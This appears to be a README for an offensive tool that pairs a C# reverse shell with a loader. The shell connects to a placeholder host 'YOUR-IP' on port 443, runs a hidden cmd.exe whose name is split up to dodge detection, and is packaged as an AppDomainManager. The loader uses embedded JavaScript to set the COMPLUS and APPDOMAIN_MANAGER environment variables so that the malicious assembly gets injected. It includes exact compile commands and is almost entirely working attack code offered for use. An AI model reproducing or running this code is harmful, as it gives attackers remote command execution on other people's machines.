# TriggerExecutionTasks
Trigger execution of tasks.dll from C# calling embedded JavaScript

C# code, reverse shell
Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:anycpu /r:System.Management.Automation.dll /target:library /unsafe tasks.cs

```
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net.Sockets;
using System.Activities;
using System.Workflow.Activities;


public sealed class MyShell : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MyProgram.Start.InitiateConnection();
        return;
    }

} 


namespace MyProgram
{

public class Start : SequentialWorkflowActivity
{
  static StreamWriter streamWriter;

  public static string InitiateConnection()
  {
    using(TcpClient tt1 = new TcpClient("YOUR-IP", 443))
    {
      using(Stream stream = tt1.GetStream())
      {
        using(StreamReader tt3 = new StreamReader(stream))
        {
          streamWriter = new StreamWriter(stream);

          StringBuilder kk1 = new StringBuilder();

          Process tt2 = new Process();
          string rr1 = "cm";
          string rr2 = "d.";
          string rr3 = "ex";
          string rr4 = "e";
          string res1 = rr1 + rr2 + rr3 + rr4;
          tt2.StartInfo.FileName = res1;
          tt2.StartInfo.CreateNoWindow = true;
          tt2.StartInfo.UseShellExecute = false;
          tt2.StartInfo.RedirectStandardOutput = true;
          tt2.StartInfo.RedirectStandardInput = true;
          tt2.StartInfo.RedirectStandardError = true;
          tt2.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
          tt2.Start();
          tt2.BeginOutputReadLine();

          while(true)
          {
            kk1.Append(tt3.ReadLine());
            tt2.StandardInput.WriteLine(kk1);
            kk1.Remove(0, kk1.Length);
          }
        }
      }
    }
  }

  private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
      {
          StringBuilder kk2 = new StringBuilder();

          if (!String.IsNullOrEmpty(outLine.Data))
          {
              try
              {
                  kk2.Append(outLine.Data);
                  streamWriter.WriteLine(kk2);
                  streamWriter.Flush();
              }
              catch (Exception err) { }
          }
      }
}
}

```

C# code, 
compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:anycpu /target:exe /unsafe sysobj.cs

```
using System;

public class MyProgram
{
    public static void Main(string[] args)
    {
        Type scriptType = Type.GetTypeFromCLSID(Guid.Parse("31D2B969-7608-426E-9D8E-A09FC9A5ACDC"));
        dynamic obj = Activator.CreateInstance(scriptType, false);
        obj.Language = "javascript";
        string script = @"new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'; new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'; new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyShell'; Trigger=new ActiveXObject('System.Object'); close();";
        obj.Eval(script);

    }
}
```

